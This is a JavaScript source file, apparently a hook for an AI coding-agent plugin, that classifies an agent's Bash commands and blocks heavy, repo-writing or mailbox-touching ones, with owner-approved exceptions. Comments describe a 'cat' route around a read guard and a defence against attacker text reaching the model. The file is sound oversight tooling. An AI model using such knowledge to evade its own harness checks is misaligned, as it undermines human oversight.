  rubyperl: /^-[A-Za-z]*[eEc]/,
};
const SCRIPT_VALUE_FLAGS = new Set(['-o', '+o', '-O', '+O', '-W', '-X', '-r', '--require', '--import', '--loader', '--experimental-loader', '-I']);
const BINARY_MAGICS = ['7f454c46', 'feedface', 'feedfacf', 'cafebabe', 'cffaedfe', 'cefaedfe', 'bebafeca'];
const HOME_MANAGED_DIRS = ['.nvm', '.pyenv', '.rbenv', '.cargo/bin', '.volta', '.asdf', 'go/bin', '.dotnet/tools', '.bun/bin'];
const HOME_PERSONAL_DIRS = ['.local/bin', 'Library', '.claude/plugins'];

// argvWithoutRedirects(segment) -> dequoted tokens minus redirect tokens (and a bare operator's target).
function argvWithoutRedirects(segment) {
  const raw = tokenizeQuoted(segment);
  const toks = [];
  for (let i = 0; i < raw.length; i++) {
    if (raw[i] !== '' && REDIRECT_TOKEN_RE.test(raw[i])) { if (BARE_REDIRECT_TOKEN_RE.test(raw[i])) i++; continue; }
    toks.push(raw[i]);
  }
  return toks;
}

// scriptRunToken(segment) -> { token, direct } for `<interpreter> [flags] <file>`
// or a direct exec (argv[0] contains `/`), else null. source/., inline
// -c/-e/-E, -m, `bash -n` and stdin are never script runs.
function scriptRunToken(segment) {
  const verb = effectiveVerb(segment).replace(/["']/g, '');
  if (!verb || verb === 'source' || verb === '.') return null;
  const toks = argvWithoutRedirects(segment);
  const vi = toks.findIndex((t) => basename(t).toLowerCase() === verb);
  if (vi === -1) return null;
  if (SCRIPT_INTERPRETERS.has(verb)) {
    const fam = SCRIPT_SHELLS.has(verb) ? 'shell' : verb.startsWith('python') ? 'python' : verb === 'node' ? 'node' : 'rubyperl';
    for (let i = vi + 1; i < toks.length; i++) {
      const t = toks[i];
      if (t === '--') return toks[i + 1] ? { token: toks[i + 1], direct: false } : null;
      if (t === '-') return null;
      if (/^[-+]/.test(t) && t.length > 1) {
        if (SCRIPT_NOT_A_RUN_FLAG[fam].test(t)) return null;
        if (SCRIPT_VALUE_FLAGS.has(t)) i++;
        continue;
      }
      return { token: t, direct: false };
    }
    return null;
  }
  return toks[vi].includes('/') ? { token: toks[vi], direct: true } : null;
}

// hookHomeRaw() -> the hook's HOME (resolveHome), '' when unavailable; hookHome() realpath'd.
function hookHomeRaw() {
  try { return require('../companion/lib/test-home-guard.js').resolveHome() || ''; } catch (_) { return ''; }
}
function hookHome() {
  const h = hookHomeRaw();
  return h ? require('./lib/scratchpad.js').realpathOrSelf(h) : '';
}

// resolveScriptPath(token, ctx) -> { real } | { unresolvable: true } | null
// (null: a relative path under an unknown cwd). `~` expands from HOME,
// `$NAME`/`${NAME}` from process.env (PWD = the effective cwd).
function resolveScriptPath(token, ctx) {
  let t = String(token);
  if (t === '~' || t.startsWith('~/')) {
    const h = hookHomeRaw();
    if (!h) return { unresolvable: true };
    t = h + t.slice(1);
  }
  if (/`|\$\(/.test(t)) return { unresolvable: true };
  let unset = false;
  t = t.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)/g, (m, a, b) => {
    const name = a || b;
    const v = name === 'PWD' ? ctx.cwd : process.env[name];
    if (typeof v !== 'string' || !v) { unset = true; return ''; }
    return v;
  });
  if (unset || t.includes('$')) return { unresolvable: true };
  if (!path.isAbsolute(t)) {
    if (ctx.cwdUnknown) return null;
    t = ctx.cwd.replace(/\/+$/, '') + '/' + t;
  }
  try { return { real: fs.realpathSync.native(t) }; } catch (_) {
    return { real: require('./lib/scratchpad.js').realpathOrSelf(path.resolve(t)) };
  }
}

// isTextScript(real, st) -> true for a regular file starting with `#!` or with
// no ELF/Mach-O magic in its first 4 bytes; false on a read error.
function isTextScript(real, st) {
  if (!st || !st.isFile()) return false;
  let fd = null;
  try {
    fd = fs.openSync(real, 'r');
    const buf = Buffer.alloc(4);
    const n = fs.readSync(fd, buf, 0, 4, 0);
    if (n >= 2 && buf[0] === 0x23 && buf[1] === 0x21) return true;
    return !BINARY_MAGICS.includes(buf.subarray(0, n).toString('hex'));
  } catch (_) {
    return false;
  } finally {
    if (fd !== null) try { fs.closeSync(fd); } catch (_) { /* ignore */ }
  }
}

// gitCleanTracked(root, abs, cache) -> true only when `git status --porcelain
// --ignored -- <rel>` prints nothing (tracked and clean). Memoised per call.
// GIT_OPTIONAL_LOCKS=0: a read-only probe must not refresh/lock .git/index.
function gitCleanTracked(root, abs, cache) {
  const key = root + '\0' + abs;
  if (cache && cache.has(key)) return cache.get(key);
  let clean = false;
  try {
    const out = require('child_process').execFileSync('git', ['status', '--porcelain=v1', '--ignored', '--', path.relative(root, abs)],
      { cwd: root, encoding: 'utf8', timeout: 2000, stdio: ['ignore', 'pipe', 'ignore'], env: Object.assign({}, process.env, { GIT_OPTIONAL_LOCKS: '0' }) });
    clean = String(out).trim() === '';
  } catch (_) { clean = false; }
  if (cache) cache.set(key, clean);
  return clean;
}

// scriptPathVerdict(real, info) -> { work, step } (pure). info = { root, home,
// fresh, isScratchOrTmp, notesTarget: () => bool, gitClean: () => bool }.
// Decision 3 steps 5-8, first match wins.
function scriptPathVerdict(real, info) {
  const i = info || {};
  const under = (dir) => !!dir && real.startsWith(dir.replace(/\/+$/, '') + '/');
  const root = i.root || null;
  const home = i.home || '';
  const inRoot = !!root && under(root);
  if (i.isScratchOrTmp || (root && under(path.join(root, '.anti-hall')))) return { work: true, step: 'scratch' };
  if (/^\/(?:bin|sbin|Applications)\//.test(real) || (/^\/(?:usr|opt)\//.test(real) && !inRoot)
    || (home && HOME_MANAGED_DIRS.some((d) => under(path.join(home, d))))
    || /(?:^|\/)node_modules\/\.bin\//.test(real) || /(?:^|\/)(?:\.venv|venv|\.virtualenv)\/bin\//.test(real)) {
    return { work: false, step: 'managed' };
  }
  if (inRoot) {
    if (!i.fresh && !i.notesTarget()) return { work: false, step: 'in-repo' };
    return { work: !i.gitClean(), step: 'in-repo' };
  }
  if (home && HOME_PERSONAL_DIRS.some((d) => under(path.join(home, d)))) return { work: !!i.fresh, step: 'outside' };
  return { work: true, step: 'outside' };
}

// scriptFileRun(segment, ctx, payload, opts, cache, rootOf) -> null | { path, step }
// (non-null = a WORK script run). Steps 1-4 here, 5-8 in scriptPathVerdict.
function scriptFileRun(segment, ctx, payload, opts, cache, rootOf) {
  const run = scriptRunToken(segment);
  if (!run) return null;
  const r = resolveScriptPath(run.token, ctx);
  if (!r) return null;
  if (r.unresolvable) return { path: run.token, step: 'unresolvable' };
  if (ANTI_HALL_CLI_PATTERNS.some((re) => re.test(segment))) return null;
  const real = r.real;
  if (isInsideAntiHallPlugin(real)) return null;
  let st = null;
  try { st = fs.statSync(real); } catch (_) { st = null; }
  if (run.direct && !isTextScript(real, st)) return null;
  const sp = require('./lib/scratchpad.js');
  const eg = require('./edit-guard.js');
  const home = hookHome();
  const { toplevel } = rootOf(ctx.cwd);
  const root = toplevel || ctx.cwd;
  // A tmp-root path counts as scratch only outside the cwd's git work tree and
  // outside HOME (a HOME that itself lives under a tmp root keeps its own steps).
  const inHome = !!home && sp.isInsideDir(real, home);
  const isScratchOrTmp = isScratchpadOrTmpPath(real, { payload, ownOnly: true })
    || (isScratchpadOrTmpPath(real, { payload }) && !(toplevel && sp.isInsideDir(real, toplevel)) && !inHome);
  const v = scriptPathVerdict(real, {
    root,
    home,
    fresh: !!st && st.isFile() && st.mtimeMs >= opts.sessionStartTs,
    isScratchOrTmp,
    notesTarget: () => eg.isNotesTarget(real, root, Object.assign({}, payload, { cwd: root })),
    gitClean: () => (toplevel ? gitCleanTracked(toplevel, real, cache) : false),
  });
  return v.work ? { path: real, step: v.step } : null;
}

const INLINE_VERBS = new Set(['python', 'python3', 'perl', 'ruby', 'node']);
const INLINE_EXEC_RE = /\b(?:subprocess|system|exec|execSync|execFileSync|spawn|spawnSync|popen|child_process)\b|\brun\s*\(|`/;
const INLINE_GIT_GH_LITERAL_RE = /(['"`])\s*((?:git|gh)\s[^'"`]*)\1/g;
const INLINE_GIT_GH_ARRAY_RE = /\[\s*(['"])(git|gh)\1((?:\s*,\s*(['"])[^'"]*\4)*)\s*\]/g;
const INLINE_OPEN_RE = /\bopen\s*\(\s*(['"])([^'"]+)\1\s*,\s*(['"])([^'"]*)\3\s*[,)]/g;
const INLINE_OPEN_NONLIT_RE = /\bopen\s*\(\s*[^'"\s)][^,)]*,\s*(['"])([^'"]*)\1\s*[,)]/g;
const INLINE_WRITEFILE_RE = /(?:write|append)File(?:Sync)?\(\s*(['"])([^'"]+)\1/g;
const INLINE_FILE_WRITE_RE = /(?:File|IO)\.write\(\s*(['"])([^'"]+)\1/g;
const INLINE_WRITE_NONLIT_RE = /(?:(?:write|append)File(?:Sync)?|(?:File|IO)\.write)\(\s*[^'"\s)]/;
const INLINE_REDIRECT_RE = /['"][^'"]*\s>>?\s*([\w./~-]+)/;
const isWriteMode = (m) => /^[rwaxbt+]{1,4}$/.test(m) && /[wax+]/.test(m);

// inlineCodeWork(segment, ctx, payload, rootOf) -> null | { precise } for
// `python|python3 -c` / `perl|ruby|node -e|-E` bodies (Decision 3, never executed).
function inlineCodeWork(segment, ctx, payload, rootOf) {
  const verb = effectiveVerb(segment).replace(/["']/g, '');
  if (!INLINE_VERBS.has(verb)) return null;
  const toks = tokenizeQuoted(segment);
  const vi = toks.findIndex((t) => basename(t).toLowerCase() === verb);
  const flags = verb.startsWith('python') ? ['-c'] : ['-e', '-E'];
  const fi = toks.findIndex((t, k) => k > vi && flags.includes(t));
  if (vi === -1 || fi === -1 || typeof toks[fi + 1] !== 'string') return null;
  const body = toks[fi + 1];
  const exec = INLINE_EXEC_RE.test(body);
  if (exec) {
    const cmds = [];
    for (const m of body.matchAll(INLINE_GIT_GH_LITERAL_RE)) cmds.push(m[2]);
    for (const m of body.matchAll(INLINE_GIT_GH_ARRAY_RE)) {
      cmds.push([m[2]].concat([...m[3].matchAll(/(['"])([^'"]*)\1/g)].map((x) => x[2])).join(' '));
    }
    if (cmds.some((c) => isStateChangingGitSegment(c) || isHeavyGhSegment(c, c))) return { precise: true };
  }
  const sp = require('./lib/scratchpad.js');
  // 'tmp' (tmp/scratch), 'notes' (a coordinator-writable repo file), 'repo' (non-notes repo file) or 'outside'.
  const targetKind = (t) => {
    if (ctx.cwdUnknown && !path.isAbsolute(t) && !t.startsWith('~')) return 'outside';
    const expanded = t === '~' || t.startsWith('~/') ? hookHomeRaw() + t.slice(1) : t;
    const resolved = path.resolve(ctx.cwd, expanded);
    const abs = path.join(sp.realpathOrSelf(path.dirname(resolved)), path.basename(resolved));
    const r = rootOf(ctx.cwd);
    const inTop = !!r.toplevel && sp.isInsideDir(abs, r.toplevel);
    if (isScratchpadOrTmpPath(abs, { payload, ownOnly: true })) return 'tmp';
    if (!inTop && isScratchpadOrTmpPath(abs, { payload })) return 'tmp';
    if (!sp.isInsideDir(abs, r.base)) return 'outside';
    return require('./edit-guard.js').isNotesTarget(abs, r.base, Object.assign({}, payload, { cwd: r.base })) ? 'notes' : 'repo';
  };
  const literals = [];
  for (const m of body.matchAll(INLINE_OPEN_RE)) if (isWriteMode(m[4])) literals.push(m[2]);
  for (const m of body.matchAll(INLINE_WRITEFILE_RE)) literals.push(m[2]);
  for (const m of body.matchAll(INLINE_FILE_WRITE_RE)) literals.push(m[2]);
  let loose = false;
  for (const t of literals) {
    const k = targetKind(t);
    if (k === 'repo') return { precise: true };
    if (k === 'outside') loose = true;
  }
  if ([...body.matchAll(INLINE_OPEN_NONLIT_RE)].some((m) => isWriteMode(m[2])) || INLINE_WRITE_NONLIT_RE.test(body)) loose = true;
  if (exec) {
    const m = body.match(INLINE_REDIRECT_RE);
    if (m && targetKind(m[1]) !== 'tmp') loose = true;
  }
  return loose ? { precise: false } : null;
}

const MAX_CLASSIFY_LEN = 65536;

function classifyBashWork(command, payload, opts = {}, depth = 0, shared = null) {
  const res = { work: false, blockable: false, labels: new Set(), editBlocks: [] };
  if (typeof command !== 'string' || !command.trim() || command.length > MAX_CLASSIFY_LEN) return res;
  const o = Object.assign({ sessionStartTs: Date.now() - 21600000 }, opts || {});
  const p = payload || {};
  const sh = shared || { command, gitCache: new Map(), trusted: undefined };
  const trusted = () => {
    if (sh.trusted === undefined) {
      try { sh.trusted = !!matchedProjectCommandAllowPattern(sh.command, (typeof p.cwd === 'string' && p.cwd) || ''); } catch (_) { sh.trusted = false; }
    }
    return sh.trusted;
  };
  const sp = require('./lib/scratchpad.js');
  const eg = require('./edit-guard.js');
  const roots = new Map();
  const startCwd = sp.realpathOrSelf(path.resolve((typeof p.cwd === 'string' && p.cwd) || process.cwd()));
  // base = the cwd's git toplevel; with none, the SESSION's project base (the
  // payload cwd's toplevel, or the payload cwd itself). A `cd` into a non-git
  // dir (e.g. ~/.claude/projects/<slug>/memory) does not make that dir a
  // project root: its files are judged against the session project, as an
  // Edit-tool write to the same file would be.
  const rootOf = (cwd) => {
    if (!roots.has(cwd)) {
      let toplevel = null;
      try { toplevel = require('../companion/lib/identity.js').resolveContext(cwd, { missingPath: 'ancestor' }).toplevel || null; } catch (_) { toplevel = null; }
      if (toplevel) toplevel = sp.realpathOrSelf(toplevel);
      const base = toplevel || (cwd === startCwd ? cwd : rootOf(startCwd).base);
      roots.set(cwd, { toplevel, base });
    }
    return roots.get(cwd);
  };
  const blocks = new Set();

  const masked = /[<>]\(/.test(command) ? maskProcessSubstitutions(command) : { text: command, inners: [] };
  // `(( n > 5 ))` / `$((3 > 2))`: the splitter cuts at `(`, so comparisons are
  // blanked before splitting or they would read as redirects.
  masked.text = blankTestOperators(masked.text);
  // `${NAME}` -> `$NAME` (not before an identifier char): the splitter cuts at braces.
  const { segments, delims } = splitSegmentsDetailed(masked.text.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}(?![A-Za-z0-9_])/g, '$$$1'));
  const ctxs = cdAwareContexts(segments, delims, p);
  segments.forEach((seg, i) => {
    let segWork = false;
    let recovery = false;
    if (isStateChangingGitSegment(seg)) {
      segWork = true;
      res.labels.add('git');
      if (isRecoveryGitSegment(seg)) { recovery = true; res.labels.add('recovery'); }
    }
    if (isHeavyGhSegment(seg, command)) { segWork = true; res.labels.add('gh'); }
    const isGit = effectiveVerb(seg) === 'git';
    for (const ctx of ctxs[i]) {
      if (!o.editOnly && scriptFileRun(seg, ctx, p, o, sh.gitCache, rootOf) && !trusted()) { segWork = true; res.labels.add('script'); }
      const inl = o.editOnly ? null : inlineCodeWork(seg, ctx, p, rootOf);
      if (inl) {
        res.work = true;
        res.labels.add('inline');
        if (inl.precise) segWork = true;
      }
      for (const t of bashWriteTargets(seg, ctx.cwd)) {
        if (/[$`*?[\]{}]/.test(t) || t.startsWith('~')) continue;
        if (ctx.cwdUnknown && !path.isAbsolute(t)) continue;
        const resolved = path.resolve(ctx.cwd, t);
        // Directory part realpath'd (/tmp -> /private/tmp), last component kept so edit-guard sees a symlink.
        const abs = path.join(sp.realpathOrSelf(path.dirname(resolved)), path.basename(resolved));
        const r = rootOf(ctx.cwd);
        const inTop = !!r.toplevel && sp.isInsideDir(abs, r.toplevel);
        // Own scratchpad always skipped; a tmp root only outside a git work tree
        // (a repo that lives under /tmp is still a repo).
        if (isScratchpadOrTmpPath(abs, { payload: p, ownOnly: true })) continue;
        if (!inTop && isScratchpadOrTmpPath(abs, { payload: p })) continue;
        const egPayload = Object.assign({}, p, { cwd: r.base });
        // F3 judges writes into the session project only ("into repo files").
        if (!sp.isInsideDir(abs, r.base)) continue;
        if (!eg.isNotesTarget(abs, r.base, egPayload)) {
          segWork = true;
          res.labels.add('repo-write');
        }
        if (!isGit && eg.editVerdict(abs, r.base, egPayload) !== 'allow') blocks.add(abs);
      }
    }
    if (segWork) {
      res.work = true;
      if (!recovery) res.blockable = true;
    }
  });

  if (depth < 3) {
    const inner = [];
    for (const seg of segments) {
      const c = extractShellCPayload(seg);
      if (c) inner.push(c);
      const e = extractEvalPayload(seg);
      if (e) inner.push(e);
    }
    inner.push(...extractSubstitutions(masked.text), ...masked.inners);
    for (const sub of inner) {
      const r = classifyBashWork(sub, payload, o, depth + 1, sh);
      res.work = res.work || r.work;
      res.blockable = res.blockable || r.blockable;
      for (const l of r.labels) res.labels.add(l);
      for (const b of r.editBlocks) blocks.add(b);
    }
  }
  res.editBlocks = [...blocks];
  return res;
}

function main() {
  // Read + parse the payload FIRST — coordinator/subagent detection needs the
  // payload's agent_id/agent_type markers (the only reliable signal under cmux).
  let raw = '';
  try {
    raw = fs.readFileSync(0, 'utf8');
  } catch (_) {
    process.exit(0);
  }

  const { isSkipped } = require('./skip-guard.js');

  let payload;
  try {
    payload = JSON.parse(raw);
  } catch (_) {
    process.exit(0);
  }

  const command = (payload && payload.tool_input && payload.tool_input.command) || '';

  // DevSwarm destructive-read redirect branch. DIFFERENT protection goal from the
  // heavy-command gate below (data-loss / shell-hang vs coordinator context-hygiene),
  // so it is evaluated FIRST — in ALL session contexts (coordinator AND subagent: a
  // delegated read drains the queue identically), with its OWN skip name
  // (`devswarm-read-guard`), independent of command-guard's own skip/coordinator gate.
  //   - monitor / read-messages (hivecontrol native reads): block UNCONDITIONALLY
  //     when DevSwarm-active (Part B — read-messages no longer needs durable-layer
  //     evidence; a raw native read desyncs the durable cursor regardless).
  //   - raw file reads (cat/head/… of ~/.anti-hall/devswarm/inbox/** or the store):
  //     the Bash-side companion to inbox-read-guard.js (the Read-tool guard), closing
  //     the `cat` bypass that this Bash-verb-only guard could not otherwise see.
  // Fully fail-open: any throw -> fall through (never block).
  try {
    let devswarmActive = false;
    try {
      devswarmActive = require('./lib/devswarm-detect.js').isDevswarmActive(process.env);
    } catch (_) {
      devswarmActive = false; // fail-open: dormant
    }
    if (devswarmActive && !isSkipped('devswarm-read-guard')) {
      // Emit via fs.writeSync(1,…) not process.stdout.write per CLAUDE.md: on macOS
      // node 18/20 a synchronous exit right after process.stdout.write can race the
      // async pipe flush and truncate the JSON; writeSync is atomic.
      const kind = detectHivectlDestructiveRead(command);
      if (kind) {
        const reason = buildDevswarmReason(kind, process.env);
        emitBlock(reason);
      }
      const cwd = (payload && payload.cwd) || '';
      const fileKind = detectProtectedFileRead(command, os.homedir(), cwd);
      if (fileKind) {
        const reason = buildRawFileReadReason(fileKind);
        emitBlock(reason);
      }
    }
  } catch (_) {
    // fail-open: never block a turn on a devswarm-branch bug.
  }

  // v0.58 "mesh-only messaging" branch: blocks the native `hivecontrol workspace
  // message-child`/`message-parent` SENDS — anti-hall's shared mesh store
  // (scripts/devswarm.js send/heartbeat) is now the SOLE agent-initiated
  // messaging transport for DevSwarm (native per-worktree messaging has no
  // from/to/broadcast and is REPLACED, PLAN.md "Locked design"). Modeled on the
  // devswarm-read-guard branch above: fires in ALL contexts (coordinator AND
  // subagent — a delegated send writes the native queue identically), its OWN
  // skip name (`devswarm-send-guard`, independent of both devswarm-read-guard
  // and command-guard's own skip below), honors DISABLE_ANTIHALL_DEVSWARM.
  // Deliberately does NOT touch message-count (read-only) or any lifecycle verb
  // (create/list/check-merge/merge) — unmatched by the regexes above, so
  // `devswarm.js spawn`/`merge` (THIN wraps of hivecontrol create/check-merge/
  // merge) are unaffected. Fully fail-open: any throw -> fall through.
  try {
    let devswarmActive = false;
    try {
      devswarmActive = require('./lib/devswarm-detect.js').isDevswarmActive(process.env);
    } catch (_) {
      devswarmActive = false; // fail-open: dormant
    }
    if (devswarmActive && !isSkipped('devswarm-send-guard')) {
      const sendKind = detectHivectlMessageSend(command);
      if (sendKind) {
        const reason = buildDevswarmSendReason(sendKind);
        emitBlock(reason);
      }
    }
  } catch (_) {
    // fail-open: never block a turn on a devswarm-send-guard bug.
  }

  // devswarm-subagent-mailbox-guard (defect f0958b13fe2b): fires ONLY in
  // SUBAGENT context, in ALL DevSwarm-active/child/coordinator combinations —
  // its OWN skip name, independent of command-guard's own skip/coordinator
  // gate below, PLUS the dedicated ANTIHALL_ALLOW_SUBAGENT_MAILBOX=1 env
  // override. Uses isSubagentByPayload (PAYLOAD MARKERS ONLY, no
  // CLAUDE_CODE_ENTRYPOINT env fallback — see that function's own header for
  // why the env fallback is unsafe HERE specifically). Fully fail-open: any
  // throw -> fall through (never block).
  try {
    const { isSubagentByPayload } = require('./coordinator-detect.js');
    if (isSubagentByPayload(payload)
      && settingsGet('guards', 'allowSubagentMailbox') !== true
      && !isSkipped('devswarm-subagent-mailbox-guard')
      && detectSubagentMailboxTouch(command)) {
      emitBlock(buildSubagentMailboxReason());
    }
  } catch (_) {
    // fail-open: never block a turn on a devswarm-subagent-mailbox-guard bug.
  }

  // git-stash-guard (defect b08b26566b92): a mutating `git stash` (push/pop/
  // drop/clear/apply/save, or bare `git stash` == push) is blocked — in
  // BOTH subagent and coordinator context — ONLY when the guard is ARMED:
  // this repo has opted into stash protection (.anti-hall/protected-stashes
  // at the git toplevel — see hasProtectedStashesMarker's own header) OR the
  // operator set ANTIHALL_STASH_GUARD=1. R2 Critic P1 (policy): the prior
  // version blocked SUBAGENT context unconditionally with no opt-in at all —
  // wrong for a PUBLIC plugin where most repos have never heard of this
  // guard and never asked for it; this file's own convention elsewhere
  // (devswarm-read-guard/devswarm-subagent-mailbox-guard fail-open by
  // default, merge-gate/ship-it gated behind an explicit env opt-in) is that
  // nothing blocks by default without a signal the operator (or the repo)
  // actually chose. `git stash list` is never matched (already a
  // LIGHT_EXCEPTIONS read-only allowance below too). Own skip name —
  // `git-stash-guard` is in skip-guard.js's DESTRUCTIVE set, so a blanket
  // "all" skip cannot silence it once armed (same protection level as
  // git-guard). Fires BEFORE the coordinator-only heavy-command gate below
  // (this is a data-safety guard, not a context-hygiene one — same
  // rationale as devswarm-read-guard/devswarm-subagent-mailbox-guard
  // above). Fully fail-open: any throw -> fall through (never block).
  try {
    if (!isSkipped('git-stash-guard')) {
      const stashSub = detectMutatingGitStash(command);
      if (stashSub) {
        const cwd = (payload && payload.cwd) || '';
        const armed = hasProtectedStashesMarker(cwd) || settingsGet('guards', 'stashGuard') === true;
        if (armed) {
          const { isSubagentByPayload } = require('./coordinator-detect.js');
          const subagent = isSubagentByPayload(payload);
          emitBlock(buildGitStashReason(stashSub, subagent));
        }
      }
    }
  } catch (_) {
    // fail-open: never block a turn on a git-stash-guard bug.
  }

  // Escape hatch: honor an explicit, user-consented skip (~/.anti-hall/skip.json).
  if (isSkipped('command-guard')) process.exit(0);
  // Settings switch safety.commandGuard (0.108.4, safety: set/reset need --confirmed).
  // Off -> the core heavy-command gate below no-ops; the data-safety
  // sub-guards above (DevSwarm read/send/mailbox, armed stash) already ran.
  // Fail-open: any error runs the gate.
  try { if (!require('./lib/settings.js').enabled('safety', 'commandGuard')) process.exit(0); } catch (_) { /* run */ }
  const { isCoordinator } = require('./coordinator-detect.js');

  // Only block heavy commands in coordinator context (subagents pass through).
  if (!isCoordinator(payload)) {
    process.exit(0);
  }

  // Bash edit parity (F3): a main-thread Bash write (sed -i/perl -i/tee/cp/mv/
  // redirect) into a file edit-guard would block for the Edit tool gets the
  // same delegation block. Off with guards.bashEditParity, safety.editGuard or
  // an edit-guard skip; a trusted (redirect-free) project command-allow match
  // passes. Both hosts (a Codex main thread is detected). Fail-open.
  try {
    if (settingsGet('guards', 'bashEditParity') !== false
      && require('./lib/settings.js').enabled('safety', 'editGuard')
      && !isSkipped('edit-guard')
      && !matchedProjectCommandAllowPattern(command, (payload && payload.cwd) || '')) {
      if (classifyBashWork(command, payload, { editOnly: true }).editBlocks.length) {
        const reason = require('./edit-guard.js').delegationReason('Bash (sed -i/perl -i/tee/cp/mv/redirect)', payload.cwd, payload);
        emitBlock(reason);
      }
    }
  } catch (_) {
    // fail-open: never block a turn on a Bash edit parity bug.
  }

  if (!isHeavyCommand(command)) {
    process.exit(0);
  }

  // Narrow allow (owner-approved 2026-09-26): a bounded, single-target
  // read-only verification command is let through even though it classified
  // heavy above — e.g. re-running one delegated test file to verify a
  // subagent's "done" claim. Fail-closed on any error (falls through to the
  // ordinary block below). See isBoundedVerificationCommand's header.
  try {
    if (settingsGet('guards', 'allowReadOnlyVerify') !== false && isBoundedVerificationCommand(command, { payload })) {
      process.exit(0);
    }
  } catch (_) {
    // fail-closed: never let a bug in this carve-out bypass the heavy-command gate.
  }

  // Per-project command allowlist (owner-approved 2026-09-26): the repo at
  // `cwd` declared this EXACT command as sanctioned to run inline in the main
  // thread (e.g. its own deploy script, never delegated by project rule).
  // MAIN THREAD ONLY — we are already past the isCoordinator(payload) gate
  // above, so a subagent never reaches this carve-out. Fail-closed on any
  // error (falls through to the ordinary block below).
  try {
    if (settingsGet('guards', 'projectCommandAllow') !== false) {
      const cwd = (payload && payload.cwd) || '';
      const matched = matchedProjectCommandAllowPattern(command, cwd);
      if (matched) {
        let repoTop = '';
        try { repoTop = require('../companion/lib/identity.js').resolveContext(cwd || process.cwd(), { missingPath: 'ancestor' }).toplevel || ''; } catch (_) { /* best-effort only */ }
        appendProjectCommandAllowAudit({ cwd, repo: repoTop, pattern: matched, command });
        process.exit(0);
      }
    }
  } catch (_) {
    // fail-closed: never let a bug in this carve-out bypass the heavy-command gate.
  }

  // "Allow plain push" (owner-approved 2026-09-26): `git add`/`git commit`/a
  // plain `git push [remote] [ref]`, and &&/; chains made up only of those
  // three, run inline in the MAIN THREAD ONLY — already past the
  // isCoordinator(payload) gate above. git-guard.js's own independent
  // force-push/AI-credit checks are untouched. Fail-closed on any error.
  try {
    if (settingsGet('guards', 'allowPlainPush') !== false) {
      const cwd = (payload && payload.cwd) || '';
      if (isAllowedPlainPushChain(command, cwd, payload)) {
        process.exit(0);
      }
    }
  } catch (_) {
    // fail-closed: never let a bug in this carve-out bypass the heavy-command gate.
  }

  // Background scratch scripts (owner-approved 2026-09-26): MAIN THREAD ONLY
  // — already past the isCoordinator(payload) gate. Only when the payload's
  // tool_input.run_in_background is true; foreground runs are unchanged.
  // See isBackgroundScratchScript's header. Fail-closed on any error.
  try {
    if (settingsGet('guards', 'allowBackgroundScratchScripts') !== false && isBackgroundScratchScript(command, payload)) {
      process.exit(0);
    }
  } catch (_) {
    // fail-closed: never let a bug in this carve-out bypass the heavy-command gate.
  }

  // Narrow read-only gcloud (owner-approved 2026-09-26): MAIN THREAD ONLY —
  // already past the isCoordinator(payload) gate. See
  // isAllowedGcloudReadCommand's header. Fail-closed on any error.
  try {
    if (settingsGet('guards', 'allowGcloudReads') !== false && isAllowedGcloudReadCommand(command)) {
      process.exit(0);
    }
  } catch (_) {
    // fail-closed: never let a bug in this carve-out bypass the heavy-command gate.
  }

  // Classification label is derived from a closed, code-defined set (heavy verb
  // allowlist or a fixed category name) — NEVER raw command/stdin text — so no
  // attacker-controlled content is reflected into the model-visible reason.
  const cls = classifyHeavy(command);
  const detected = cls && cls.kind === 'remote' ? 'State-changing remote operation detected' : 'Heavy command detected';
  const detail = cls && cls.kind === 'remote' ? '' : cls
    ? (cls.kind === 'verb'
        ? '(verb: ' + cls.label + ')'
        : '(category: ' + cls.label + ')')
    : '(category: heavy)';

  // DevSwarm PRIMARY redirect (lazy-require, fail-open to the baseline wording).
  // The Primary's TOP fan-out tier is a CHILD WORKSPACE, not a subagent
  // (docs/KB-devswarm-hivecontrol.md §8.1-8.2). Naming "spawn a subagent" as the
  // only exit at the exact point the Primary is blocked from running the command
  // is what drove Primaries to decompose feature-scale work into subagents instead
  // of workspaces. NOTHING about WHAT is blocked changes — same isHeavyCommand()
  // decision, same exit 2 — only the redirect text, and only for a Primary. A
  // DevSwarm CHILD, and any non-DevSwarm session, gets the byte-identical baseline
  // reason below. No mechanical scale classifier (a false positive would break
  // legitimate subagent use): the reason states the CHOICE, the model classifies.
  let devswarmPrimary = false;
  try {
    devswarmPrimary =
      require('./lib/devswarm-detect.js').isDevswarmActive(process.env) &&
      !require('./lib/devswarm-role.js').isChildWorkspace(process.env);
  } catch (_) {
    devswarmPrimary = false;
  }

  // Names EXACTLY the shapes isQualifyingSingleTargetCheck accepts (plus the
  // run_in_background scratch-script rule) — keep in sync with those.
  const INLINE_ALLOWED_HINT =
    'Inline-allowed ONLY when piped to tail/head/wc/grep -c/grep -m N: `python3 -m pytest -q <one file>`, ' +
    '`node --test <1-2 files>`, `[npx] vitest run|jest <1-2 *.test|spec files>`, `ctest -R <name>`, `<cc> -fsyntax-only`, `git clone --depth 1 <https-url> <scratch/tmp dir>`, ' +
    'a non-heavy command with --check/--dry-run/--list, or `<python3|node|ruby|perl|php> <existing script> --check`.';
  // The path that WORKS comes first, in one line, in every variant (fp: agents
  // re-checking a subagent's claim read the long delegate-only text and missed it).
  // TEXT ONLY: same rule, same inline-allowed set. Rules clause keeps the exact
  // shapes the carve-out accepts.
  const SCRATCHPAD_SCRIPT_HINT =
    'To read output yourself: put a READ-ONLY command in a scratchpad script and run it with run_in_background (executable, literal absolute path, no VAR=... prefix, chain only wc/head/tail/grep -c/grep -m N; each run counts as main-thread work; a script piped to tail is still blocked in the foreground). ' +
    'Commits, pushes, patch applies, gh mutations, repo edits and test runs go to a subagent.';
  // A leading `cd <dir>;` leaves the cwd unknown (only an unconditional `&&`
  // cd is tracked), so a relative-path check fails ONLY because of the `;`.
  // Hint exactly then: the same command joined with `&&` would qualify.
  let cdJoinHint = '';
  try {
    const m = /^(\s*cd\s+[^;&|\n]+?)\s*;/.exec(command);
    if (m && isBoundedVerificationCommand(m[1] + ' &&' + command.slice(m[0].length), { payload })) {
      cdJoinHint = ' To run the check inline, use `cd <dir> &&`, not `;`.';
    }
  } catch (_) { /* hint is best-effort */ }
  // Workspace recommendation shared with the other Primary tier text
  // (lib/primary-tier.js): suppressed in a repo that forbids workspaces for real
  // work. Advice text only; the block decision above is unchanged. Fail-open
  // to the subagent-only text.
  let tierText = false;
